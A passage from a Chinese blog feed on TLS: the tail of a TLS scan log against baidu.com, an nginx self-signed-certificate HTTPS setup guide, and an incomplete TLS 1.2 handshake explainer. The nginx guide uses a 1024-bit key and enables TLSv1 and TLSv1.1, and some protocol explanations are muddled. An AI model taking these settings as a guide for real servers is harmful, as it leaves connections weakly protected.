punctuation">[</span>*<span class="token punctuation">]</span> New files created:    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Output directory: TLSSLed_1.3_www.baidu.com_443_20200821-110138 <span class="token punctuation">..</span>.openssl_HEAD_1.0_www.baidu.com_443_20200821-110138.err    openssl_HEAD_www.baidu.com_443_20200821-110138.log        openssl_RENEG_www.baidu.com_443_20200821-110138.erropenssl_HEAD_1.0_www.baidu.com_443_20200821-110138.log    openssl_RENEG_LEGACY_www.baidu.com_443_20200821-110138.err  openssl_RENEG_www.baidu.com_443_20200821-110138.logopenssl_HEAD_www.baidu.com_443_20200821-110138.err    openssl_RENEG_LEGACY_www.baidu.com_443_20200821-110138.log  sslscan_www.baidu.com_443_20200821-110138.log<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-openssl"><a href="#7-openssl" class="headerlink" title="7 openssl"></a>7 openssl</h2><pre><code> openssl s_client -connect www.baidu.com:443　　【s_client:作为一个客户端 -connect：连接 +服务器域名:端口】 </code></pre><p><img src="/2020/08/26/htps-tools/1598432415793.png" alt="1598432415793"></p><p><img src="/2020/08/26/htps-tools/1596439698251.png" alt="1596439698251"></p><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p> <a href="https://blog.csdn.net/qq_42696904/article/details/85267927?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_42696904/article/details/85267927?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-1&amp;spm=1001.2101.3001.4242</a> </p><p> <a href="https://github.com/nabla-c0d3/sslyze">https://github.com/nabla-c0d3/sslyze</a> </p><p> <a href="https://nabla-c0d3.github.io/sslyze/documentation/">https://nabla-c0d3.github.io/sslyze/documentation/</a> </p><p> <a href="https://www.freebuf.com/sectool/99151.html">https://www.freebuf.com/sectool/99151.html</a> </p><p> <a href="https://www.infinisign.com/faq/tls-ssl-security-testing">https://www.infinisign.com/faq/tls-ssl-security-testing</a> </p><p> <a href="https://testssl.sh/">https://testssl.sh/</a> </p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/htps-tools/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>搭建https网站</title>
      <link>https://m01ly.github.io/2020/08/26/htps-build/</link>
      <guid>https://m01ly.github.io/2020/08/26/htps-build/</guid>
      <pubDate>Wed, 26 Aug 2020 08:29:43 GMT</pubDate>
      
      <description>&lt;p&gt;环境：centos 7&lt;/p&gt;
&lt;p&gt;nginx 版本：1.19.1&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>环境：centos 7</p><p>nginx 版本：1.19.1</p><a id="more"></a><h2 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1 安装nginx"></a>1 安装nginx</h2><p>按照 <a href="https://www.runoob.com/linux/nginx-install-setup.html">https://www.runoob.com/linux/nginx-install-setup.html</a> 教程安装即可，记得安装最新版。</p><pre><code>wget http://nginx.org/download/nginx-1.19.1.tar.gz</code></pre><p>nginx安装目录配置 nginx.conf 如下：/usr/local/webserver/nginx/conf</p><h2 id="2-自签名证书"><a href="#2-自签名证书" class="headerlink" title="2 自签名证书"></a>2 自签名证书</h2><h3 id="2-1-CA根证书的生成步骤"><a href="#2-1-CA根证书的生成步骤" class="headerlink" title="2.1 CA根证书的生成步骤"></a>2.1 CA根证书的生成步骤</h3><p>新建一个文件夹ssl</p><pre><code>mkdir sslcd ssl</code></pre><h4 id="2-1-1-生成私钥"><a href="#2-1-1-生成私钥" class="headerlink" title="2.1.1 生成私钥"></a>2.1.1 <strong>生成私钥</strong></h4><p>生成CA私钥（.key）–&gt;生成CA证书请求（.csr）–&gt;自签名得到根证书（.crt）（CA给自已颁发的证书）。</p><pre class="line-numbers language-csharp"><code class="language-csharp"><span class="token preprocessor property"># Generate CA private key </span>openssl genrsa <span class="token operator">-</span><span class="token keyword">out</span> ca<span class="token punctuation">.</span>key <span class="token number">2048</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/26/htps-build/1597046435726.png" alt="1597046435726"></p><h4 id="2-1-2-生成证书请求文件"><a href="#2-1-2-生成证书请求文件" class="headerlink" title="2.1.2   生成证书请求文件"></a>2.1.2   <strong>生成证书请求文件</strong></h4><p> 这个过程会要求输入很多信息如国家、城市、组织信息等，其中 <code>Common Name (eg, your name or your server&#39;s hostname)</code> 是 <strong>必填项</strong> ，可以是域名或者 IP，其他都可以回车跳过，但是这样的话在签名证书时候会报错，下一章详述，不过自签名证书不影响。 </p><pre><code># Generate CSR openssl req -new -key ca.key -out ca.csr</code></pre><p><img src="/2020/08/26/htps-build/1597046507003.png" alt="1597046507003"></p><h4 id="2-1-3-生成自签名证书"><a href="#2-1-3-生成自签名证书" class="headerlink" title="2.1.3    生成自签名证书"></a>2.1.3    <strong>生成自签名证书</strong></h4><pre><code># Generate Self Signed certificate（CA 根证书）openssl x509 -req -days 365 -in ca.csr -signkey ca.key -out ca.crt</code></pre><p><img src="/2020/08/26/htps-build/1597046586371.png" alt="1597046586371"></p><h3 id="2-2-用户证书的生成步骤"><a href="#2-2-用户证书的生成步骤" class="headerlink" title="2.2 用户证书的生成步骤"></a>2.2 用户证书的生成步骤</h3><h4 id="2-2-1-生成私钥"><a href="#2-2-1-生成私钥" class="headerlink" title="2.2.1. 生成私钥"></a><strong>2.2.1. 生成私钥</strong></h4><p>生成私钥（.key）–&gt;生成证书请求（.csr）–&gt;用CA根证书签名得到证书（.crt）</p><p>服务器端用户证书：</p><pre class="line-numbers language-html"><code class="language-html"># private key$openssl genrsa -des3 -out server.key 1024 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/26/htps-build/1597046728463.png" alt="1597046728463"></p><h4 id="2-2-2-生成证书请求"><a href="#2-2-2-生成证书请求" class="headerlink" title="2.2.2 生成证书请求"></a>2.2.2 生成证书请求</h4><pre><code># generate csr$openssl req -new -key server.key -out server.csr</code></pre><p><img src="/2020/08/26/htps-build/1597046781761.png" alt="1597046781761"></p><h4 id="2-2-3-生成证书（根证书对用户的证书请求签名，最终生成用户证书）"><a href="#2-2-3-生成证书（根证书对用户的证书请求签名，最终生成用户证书）" class="headerlink" title="2.2.3  生成证书（根证书对用户的证书请求签名，最终生成用户证书）"></a>2.2.3  <strong>生成证书（根证书对用户的证书请求签名，最终生成用户证书）</strong></h4><p> 使用 <code>x509</code> 工具生成证书，因为它默认不使用 <code>openssl.cnf</code> </p><pre><code># generate certificate$openssl x509 -req -in server.csr -CA ca.crt \ -CAkey ca.key -out server.crt -CAcreateserial</code></pre><p><img src="/2020/08/26/htps-build/1597046922337.png" alt="1597046922337"></p><h4 id="2-2-4-验证证书有效性"><a href="#2-2-4-验证证书有效性" class="headerlink" title="2.2.4  验证证书有效性"></a>2.2.4  验证证书有效性</h4><pre><code>openssl verify -CAfile ca.crt server.crt</code></pre><p><img src="/2020/08/26/htps-build/1597047002938.png" alt="1597047002938"></p><h4 id="2-2-5-导出证书"><a href="#2-2-5-导出证书" class="headerlink" title="2.2.5 导出证书"></a>2.2.5 导出证书</h4><pre><code>cat server.crt server.key &gt; server.pem</code></pre><p><img src="/2020/08/26/htps-build/1597047735585.png" alt="1597047735585"></p><h2 id="3-配置nginx"><a href="#3-配置nginx" class="headerlink" title="3 配置nginx"></a>3 配置nginx</h2><p>将openssl生成的证书文件复制到nginx的目录下：</p><pre><code>[root@localname ~]#  cp -r ssl  /usr/local/webserver/nginx/conf/ssl</code></pre><h4 id="3-1-1-配置nginx-conf文件"><a href="#3-1-1-配置nginx-conf文件" class="headerlink" title="3.1.1 配置nginx.conf文件"></a>3.1.1 配置nginx.conf文件</h4><p>配置/usr/local/webserver/nginx/conf目录下的nginx.conf文件</p><pre><code>vim  /usr/local/webserver/nginx/conf/nginx.conf</code></pre><p>修改文件如下：</p><p><img src="/2020/08/26/htps-build/1597047296881.png" alt="1597047296881"></p><pre><code>server  &#123;    listen 443;#监听端口    server_name 192.168.10.136;#域名    index index.html index.htm index.php;    root /usr/local/webserver/nginx/html;#站点目录   #注意这些路径是相对于/etc/nginx/nginx.conf文件位置    ssl on;    ssl_certificate ssl/server.crt;    ssl_certificate_key ssl/server.key;    ssl_session_timeout 5m;    ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置    ssl_prefer_server_ciphers on;    location ~ .*\.(php|php5)?$    &#123;      #fastcgi_pass unix:/tmp/php-cgi.sock;      fastcgi_pass 127.0.0.1:9000;      fastcgi_index index.php;      include fastcgi.conf;    &#125;    location ~ .*\.(gif|jpg|jpeg|png|bmp|swf|ico)$    &#123;      expires 30d;  # access_log off;    &#125;    location ~ .*\.(js|css)?$    &#123;      expires 15d;   # access_log off;    &#125;    access_log off;  &#125;</code></pre><h4 id="3-1-2-测试-停止-重启nginx服务"><a href="#3-1-2-测试-停止-重启nginx服务" class="headerlink" title="3.1.2  测试 /停止/重启nginx服务"></a>3.1.2  测试 /停止/重启nginx服务</h4><p>编译/usr/local/webserver/nginx/sbin/nginx  -t</p><p><img src="/2020/08/26/htps-build/1597044719436.png" alt="1597044719436"></p><p>重启  nginx：/usr/local/webserver/nginx/sbin/nginx  -s stop</p><p>启动：/usr/local/webserver/nginx/sbin/nginx</p><p>浏览器输入（本机ip地址）：<a href="https://192.168.10.136/">https://192.168.10.136/</a></p><p><img src="/2020/08/26/htps-build/1597044598226.png" alt="1597044598226"></p><p><img src="/2020/08/26/htps-build/1597044868039.png" alt="1597044868039"></p><p>这时候发现浏览器提示不安全的链接,这个时候将根证书ca.crt导入浏览器,重启,发现提示消失了.</p><h2 id="4-nginx日常操作命令"><a href="#4-nginx日常操作命令" class="headerlink" title="4 nginx日常操作命令"></a>4 nginx日常操作命令</h2><p>nginx -t 测试配置文件<br>nginx -s reload 修改配置后重载生效<br>nginx -s reopen 重新打开日志文件<br>nginx -s stop 快速停止<br>nginx -s quit</p><p>查看nginx进程<br>ps -ef | grep nginx</p><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p><a href="https://www.gokuweb.com/operation/d95eae05.html">https://www.gokuweb.com/operation/d95eae05.html</a><br><a href="https://blog.csdn.net/liuchunming033/article/details/48470575">https://blog.csdn.net/liuchunming033/article/details/48470575</a> </p><p><a href="https://juejin.im/post/6844903729632641031">https://juejin.im/post/6844903729632641031</a> </p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/htps-build/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>竟然有人能把https/TLS1.2协议讲的这么详细</title>
      <link>https://m01ly.github.io/2020/08/26/apple/</link>
      <guid>https://m01ly.github.io/2020/08/26/apple/</guid>
      <pubDate>Wed, 26 Aug 2020 07:38:15 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;1-https&quot;&gt;&lt;a href=&quot;#1-https&quot; class=&quot;headerlink&quot; title=&quot;1  https&quot;&gt;&lt;/a&gt;1  https&lt;/h2&gt;&lt;p&gt;SSL(Secure Sockets Layer) 安全套接层，是一种安全协议，经历了 SSL 1.0、2.0、3.0 版本后发展成了标准安全协议 - TLS(Transport Layer Security) 传输层安全性协议。TLS 有 1.0 (RFC 2246)、1.1(RFC 4346)、1.2(RFC 5246)、1.3(RFC 8446) 版本。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-https"><a href="#1-https" class="headerlink" title="1  https"></a>1  https</h2><p>SSL(Secure Sockets Layer) 安全套接层，是一种安全协议，经历了 SSL 1.0、2.0、3.0 版本后发展成了标准安全协议 - TLS(Transport Layer Security) 传输层安全性协议。TLS 有 1.0 (RFC 2246)、1.1(RFC 4346)、1.2(RFC 5246)、1.3(RFC 8446) 版本。</p><a id="more"></a><img src="/2020/08/26/apple/1597202957092.png" alt="1597202957092" style="zoom: 50%;"><h3 id="1-1-安全协议必备元素"><a href="#1-1-安全协议必备元素" class="headerlink" title="1.1 安全协议必备元素"></a>1.1 安全协议必备元素</h3><p>在一个不安全的信道传输，我们需要保证三点:</p><p>(1)一是保证数据来源可靠性(身份认证)及在通信过程中数据的完整性（防篡改和防伪造），有数字签名和HMAC两种做法。数字签名是用私钥对报文进行签名生成数字签名，然后公钥对数字签名进行验证，常见的有SM2，RSA等；HMAC是通信两边用同一个密钥，运行常见的哈希函数MD5，SHA-1等进行哈希运算生成字符串，然后两边生成的字符串进行比较。具体细节，请参见XXXXXXXXX。</p><p>(2)另外一种是保证数据机密性，即对数据进行加密传输，加密算法分为对称算法和非对称算法，非对称算法有两个密钥，公钥加密，私钥解密，安全性较高，但加解密速度较慢，例如RSA加密算法；对称算法只有一个密钥，对称算法又分流加密（CR4等）和分组密码算法（AES，3DES等），流加密速度更快，相比于非对称加密，对称算法加解密速度较快，安全性较低。</p><p>(3)防重放:加入新鲜因子,随机数等.</p><img src="/2020/08/26/apple/1597634074757.png" alt="1597634074757" style="zoom: 67%;"><p>因此通常一个安全协议的设计需要满足基础三点，保证数据完整性（防篡改）和机密性，综合效率及安全性分析，通常的做法是将对称算法与非对称算法结合使用，即利用非对称算法协商出一个会话密钥，然后会话密钥作为对称算法的密钥进行加密，HMAC运行。</p><h3 id="1-2-TSL-协议体系结构"><a href="#1-2-TSL-协议体系结构" class="headerlink" title="1.2 TSL 协议体系结构"></a>1.2 TSL 协议体系结构</h3><img src="/2020/08/26/apple/1597635119718.png" alt="1597635119718" style="zoom:80%;"><p>TLS的体系结构中包含两个协议子层，其中底层是SSL记录协议层（SSL Record Protocol Layer）；高层是SSL握手协议层（SSL HandShake Protocol Layer）。</p><p>TLS协议主要分为两层：</p><p>(1) TLS记录协议层的作用是为高层协议提供基本的安全服务。TLS记录协议针对HTTP协议进行了特别的设计，使得超文本的传输协议HTTP能够在TLS运行。纪录封装各种高层协议，具体实施压缩解压缩、加密解密、计算和校验MAC等与安全有关的操作。</p><p>(2) TLS握手协议层包括握手协议（HandShake Protocol）、密码参数修改协议（Change Cipher Spec Protocol）和告警协议（Alert Protocol）。握手层的这些协议用于管理信息的交换，允许应用协议传送数据之间相互验证，协商加密算法和生成密钥等。</p><p>其中最重要的是记录协议和握手协议：</p><p>(1) TLS记录协议：它建立在可靠的传输（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能。</p><p>(2) TLS握手协议：它建立在TLS记录协议之上，用于在实际的数据传输开始之前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p><p>如下图所示,可以看到TLS握手层是建立在TLS记录层之上的。</p><p><img src="/2020/08/26/apple/1597635346378.png" alt="1597635346378"></p><h3 id="1-3-TLS密码套件结构"><a href="#1-3-TLS密码套件结构" class="headerlink" title="1.3 TLS密码套件结构"></a>1.3 TLS密码套件结构</h3><p><img src="/2020/08/26/apple/1597654968578.png" alt="1597654968578"></p><p>密码套件是客户端与服务器约定交互过程中需要的密码算法系列，如上图所示，以TLS开头，</p><p>（1）第一个参数为密钥交换算法，即协商预主密钥pre-master key所用的算法，主要有两类。分别是</p><p>（a）基于Diffie-Hellman交换算法的：ECDHE，DHE，DH，ECDH</p><p>DH密钥交换原理如下图,图中的k即为pre-master key:</p><img src="/2020/08/26/apple/1597651450749.png" alt="1597651450749" style="zoom:67%;"><p>DH和ECDH主要不同在于基于的困难问题稍有不同，DH是基于离散对数困难问题，而ECDH是基于椭圆曲线上的离散对数问题；任何基于离散对数上的都可以换算到椭圆曲线上。椭圆曲线上密钥长度只需要较短的即可达到基础域中较长的安全性，例如160比特的椭圆曲线密钥和1024比特的RSA密钥的安全性相当。越小的密钥在速度、效率、带宽、存储上有着许多优势 。</p><p>对于DHE与DH的主要不同在于后面有个E，E代表了“临时”，即在握手流程中，作为服务器端，ECDH少了一步计算Pb的过程，Pb用证书中的公钥代替，而证书对应的私钥就是Xb。由此可见，使用ECDH密钥交换算法，服务器必须采用ECC证书；服务器不发送server key exchange报文，因为发送certificate报文时，证书本身就包含了Pb信息。 </p><p>（b）基于RSA的密钥交换算法：客户端利用RSA公钥加密pre-master key，服务器端私钥解密出预主密钥</p><img src="/2020/08/26/apple/1597651364544.png" alt="1597651364544" style="zoom: 67%;"><p>综上几种密钥交换算法比较如下表所示:</p><table><thead><tr><th></th><th>ECDHE</th><th>ECDH</th><th>DHE</th><th>DH</th><th>RSA</th></tr></thead><tbody><tr><td>server key exchange</td><td>Y</td><td>N（证书中的公钥Pb）</td><td>Y</td><td>N（证书中的公钥及Pb）</td><td>N</td></tr><tr><td>前向安全性</td><td>Y</td><td>N</td><td>Y</td><td>N</td><td>N</td></tr></tbody></table><p>（2）第二部分为身份认证算法，即数字签名算法，这里根据密码套件不同，代表的含义也不同。</p><p>（a）密钥交换算法为ECDHE情况下，签名算法指的是 serverkeyexchange被签名的算法，只有2种ECDSA和RSA，具体是哪种完全取决于证书的公钥类型（ECC RSA）。如果你的证书是ECC公钥，那么服务器不可能选择ECDHE_RSA这种套件。 </p><p>（b）ECDH的情况下，签名算法 指的是 证书自身的被签名算法。 如果服务器部署的是RSA签名算法的证书，那么必须使用ECDH_RSA套件；反之亦然。 </p><p>（3）第三部分AES_128_GCM，主要为加密算法，一般是加密算法+加密强度（128位/256位）+工作模式（CBC/GCM），用于后面加密传输所用的算法，保证数据传输过程中的机密性。</p><p>（4） 第四部分SHA256为哈希算法，用于HMAC和PRF，保证数据在传输过程中的完整性。</p><h2 id="2-https协议总框架"><a href="#2-https协议总框架" class="headerlink" title="2 https协议总框架"></a>2 https协议总框架</h2><p>如下图为https协议总框架,首先</p><p>非对称协商会话密钥，然后用会话密钥加密传输。</p><img src="/2020/08/26/apple/1597630781001.png" alt="1597630781001" style="zoom:67%;"><p>下面以具体wireshark抓包具体报文进行解说。（密码套件TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256为例）拦截<a href="http://www.google.com的https连接报文.其中2.1到2.6为握手层协议,2.7为记录协议/">www.google.com的https连接报文。其中2.1到2.6为握手层协议,2.7为记录协议</a>.</p><h3 id="2-1-Client-hello"><a href="#2-1-Client-hello" class="headerlink" title="2.1 Client hello"></a>2.1 Client hello</h3><p>这条消息是客户端向服务器端发送连接请求。</p><p><img src="/2020/08/26/apple/1597635473766.png" alt="1597635473766"></p><p>Version: 协议版本（protocol version）指示客户端支持的最佳协议版本</p><p>Random: 一个 32 字节数据，28 字节是随机生成的 (图中的 Random Bytes)；剩余的 4 字节包含额外的信息，与客户端时钟有关 (图中使用的是 GMT Unix Time)。在握手时，客户端和服务器都会提供随机数，客户端的暂记作 random_C (用于后续的密钥的生成)。这种随机性对每次握手都是独一无二的，在身份验证中起着举足轻重的作用。它可以防止 <a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>，并确认初始数据交换的完整性。</p><p>Session ID: 在第一次连接时，会话 ID（session ID）字段是空的，这表示客户端并不希望恢复某个已存在的会话。典型的会话 ID 包含 32 字节随机生成的数据，一般由服务端生成通过 ServerHello 返回给客户端。</p><p>Cipher Suites: 密码套件（cipher suite）块是由客户端支持的所有密码套件组成的列表，该列表是按优先级顺序排列的.</p><pre><code>Cipher Suites (19 suites)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02c)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02b)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 (0xc024)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 (0xc023)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (0xc028)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (0xc027)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (0xc009)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)    Cipher Suite: TLS_RSA_WITH_AES_256_GCM_SHA384 (0x009d)    Cipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)    Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA256 (0x003d)    Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA256 (0x003c)    Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)    Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)    Cipher Suite: TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a)</code></pre><p>Compression: 客户端可以提交一个或多个支持压缩的方法。默认的压缩方法是 null，代表没有压缩</p><p>Extensions: 扩展（extension）块由任意数量的扩展组成。这些扩展会携带额外数据</p><h3 id="2-2-Server-hello"><a href="#2-2-Server-hello" class="headerlink" title="2.2 Server hello"></a>2.2 Server hello</h3><p>这条消息是服务器对client hello的响应。</p><p><img src="/2020/08/26/apple/1597635614246.png" alt="1597635614246"></p><p>这个消息的结构与 ClientHello 类似，只是每个字段只包含一个选项，其中包含服务端的 random_S 参数 (用于后续的密钥协商)。服务器无需支持客户端支持的最佳版本。如果服务器不支持与客户端相同的版本，可以提供某个其他版本以期待客户端能够接受。</p><p>图中的 <code>Cipher Suite</code> 是后续密钥协商和身份验证要用的加密套件TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256，此处选择的密钥交换与签名算法是 ECDHE_RSA，对称加密算法是 AES-128，后面会讲到这个</p><p>还有一点默认情况下 TLS 压缩都是关闭的，因为 <a href="https://zh.wikipedia.org/wiki/CRIME">CRIME</a> 攻击会利用 TLS 压缩恢复加密认证 cookie，实现会话劫持，而且一般配置 gzip 等内容压缩后再压缩 TLS 分片效益不大又额外占用资源，所以一般都关闭 TLS 压缩</p><h3 id="2-3-Certificate"><a href="#2-3-Certificate" class="headerlink" title="2.3 Certificate"></a>2.3 Certificate</h3><p>典型的 Certificate 消息用于携带服务器 X.509 <a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E4%BB%BB%E9%8F%88">证书链</a>。 服务器必须保证它发送的证书与选择的算法套件一致。</p><p><img src="/2020/08/26/apple/1597645649605.png" alt="1597645649605"></p><h4 id="2-3-1-证书内容"><a href="#2-3-1-证书内容" class="headerlink" title="2.3.1 证书内容"></a>2.3.1 证书内容</h4><p>注意证书链的顺序，最下层证书在前（用户证书在前，上级证书在后）。发送的证书是二进制格式，并非base64之后的格式。有个技巧，在wireshark右键<strong>“导出分组字节流”</strong>功能，然后保存证书,后缀为der，是可以变成一个正常证书的（二进制格式）。</p><img src="/2020/08/26/apple/1597648718865.png" alt="1597648718865" style="zoom:150%;"><p>下面对证书内容进行分析：</p><p>图中从右到左分别是1级根证书为Google Trust Services，二级中间证书为GTS CA，三级证书为google-analytics；从上到下为每个证书中的详细信息。</p><p>首先需要特别说明证书中的重点内容是什么？</p><p>（1）版本：Version，V3。对应的是X.509 V3标准</p><p>（2）序列号：证书颁发者唯一序列号</p><p>（3）签名算法：<strong>注意！证书中的签名算法指的是上级证书运行的签名算法，生成数字签名的；而不是</strong></p><p><strong>本级证书拥有的签名算法。</strong>例如，3级证书中的签名算法为sha256RSA，应该与2级证书的公钥RSA是一致的。</p><p>（４）签名哈希算法：同样是上级证书签名时用的哈希算法。</p><p>（５）公钥及公钥参数:<strong>注意本即证书的公钥，该公钥不是用于验证2级证书生成的数字签名的.**该公钥是用于后面</strong>server key exchange的;具体用法如下:</p><p>(a)对于ECDHE和DHE密钥交换算法,服务器端需要server key exchange,发送用于DH的公钥Pb及对公钥的数字签名(防止公钥在通信过程被篡改),那服务器证书的公钥就是用来验证该签名的;</p><p>(b)对于不需要server key exchange的DH,ECDH密钥交换算法,服务器证书中的公钥就是DH密钥交换的Pb;</p><p>(c) 对于不需要server key exchange的RSA密钥交换算法:服务器证书中的公钥是用于加密第三个随机数预主密钥pre-master key的.</p><h4 id="2-3-2-证书验证过程"><a href="#2-3-2-证书验证过程" class="headerlink" title="2.3.2 证书验证过程"></a>2.3.2 证书验证过程</h4><p>证书链验证过程如下:(简易图)</p><p>首先利用一级证书中的RSA公钥验证二级证书,再用二级证书中的RSA公钥验证三级证书,即服务器证书;服务器证书中的ECC公钥,公钥参数ECDSA用于密钥交换,具体功能在2.3.1已阐述;</p><p><img src="/2020/08/26/apple/1597651071958.png" alt="1597651071958"></p><h3 id="2-4-第三个随机数的密钥协商"><a href="#2-4-第三个随机数的密钥协商" class="headerlink" title="2.4  第三个随机数的密钥协商"></a>2.4  第三个随机数的密钥协商</h3><p>不同的密码套件,也会有不一样的密钥协商算法具体1.3节已分析;该次交互选择的密码交互算法为ECDHE_ECDSA;</p><h4 id="2-4-1-Server-key-exchange"><a href="#2-4-1-Server-key-exchange" class="headerlink" title="2.4.1 Server key exchange"></a>2.4.1 Server key exchange</h4><p>从下面可以看到报文信息如下:</p><p>(1)公钥Pubkey:服务器端发送Pb(对应的私钥为b),以及DH用到的相关参数,比如选择的椭圆曲线等</p><p>(2)数字签名Signature:服务器利用私钥b运行ECDSA签名算法生成的数字签名,保证公钥来源的可靠性和完整性,客户端收到该签名后,用之前收到的服务器证书中的ECC公钥进行签名验证.</p><p><img src="/2020/08/26/apple/1597651555493.png" alt="1597651555493"></p><h4 id="2-4-2-Client-key-exchange"><a href="#2-4-2-Client-key-exchange" class="headerlink" title="2.4.2 Client key exchange"></a>2.4.2 Client key exchange</h4><p>客户端发送公钥Pa</p><p><img src="/2020/08/26/apple/1597652043883.png" alt="1597652043883"></p><p>然后双方根据Diffie-Hellman算法分别计算出pre-master key;具体计算过程在1.3已写.</p><h3 id="2-5-Finished-Encrypted-Handshake-Message"><a href="#2-5-Finished-Encrypted-Handshake-Message" class="headerlink" title="2.5 Finished (Encrypted Handshake Message)"></a>2.5 Finished (Encrypted Handshake Message)</h3><p>这个报文的目的就是告诉对端自己在整个握手过程中收到了什么数据，发送了什么数据。来保证中间没人篡改报文。客户端和服务器端都会分别发送.</p><p>其次，这个报文作用就是确认密钥的正确性。因为Encrypted handshake message是使用对称密钥进行加密的第一个报文，如果这个报文加解密校验成功，那么就说明对称密钥是正确的。</p><p>计算方法也比较简单，将之前<strong>所有</strong>的握手数据（包括接受、发送），计算md运算，然后计算prf，然后就是使用协商好的对称密钥进行加密了。 ( 从client hello开始，到目前准备发送“Encrypted handshake message”前，自己所有收到和发送的handshake类型的握手数据。 )</p><p><img src="/2020/08/26/apple/1597653653860.png" alt="1597653653860"></p><h3 id="2-6-密钥产生"><a href="#2-6-密钥产生" class="headerlink" title="2.6 密钥产生"></a>2.6 密钥产生</h3><p><img src="/2020/08/26/apple/1597652305214.png" alt="1597652305214"></p><p>如上图所示,此时客户端,服务器端都已经获取全部的计算协商密钥需要的信息: 两个明文随机数 CR 和 SR与自己计算产生的 Pre-master，然后得到主密钥master.为了保证信息的完整性和机密性，TSL需要有六个密钥：四个密钥和两个IV。为了信息的可信性，客户端需要一个密钥（HMAC），为了加密要有一个密钥，为了分组加密要一个IV，服务也是如此。</p><pre><code>master= PRF(Pre_master, &quot;master secret&quot;, CR + SR)</code></pre><h4 id="2-6-1-生成主密钥Master-key"><a href="#2-6-1-生成主密钥Master-key" class="headerlink" title="2.6.1 生成主密钥Master key"></a>2.6.1 生成主密钥Master key</h4><p>主密钥Master key的生成如下,图中的MD5算法是在密码套件中指定的;根据三个参数预备主密钥PM,服务器端随机数SR,客户端随机数CR,经过不断的迭代,最终生成48字节的主密钥master key.</p><p><img src="/2020/08/26/apple/1598427741876.png" alt="1598427741876"></p><h4 id="2-6-2-生成密钥材料"><a href="#2-6-2-生成密钥材料" class="headerlink" title="2.6.2 生成密钥材料"></a>2.6.2 生成密钥材料</h4><p> 密钥材料需要以下6个,具体生成过程如下图所示.</p><p>(1)客户端MAC密钥 :Auth .Key</p><p>(2)服务器端MAC密钥 :Auth .Key</p><p>(3) 